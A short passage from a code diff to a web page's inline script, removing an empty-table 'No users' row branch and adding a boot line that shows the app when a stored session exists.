-    :`<tr><td colspan="3" style="color:var(--muted);text-align:center;padding:16px">No users</td></tr>`;
-}
+
+/* boot */
+if (store.get("session")) showApp();
 </script>
 </body>
 </html>
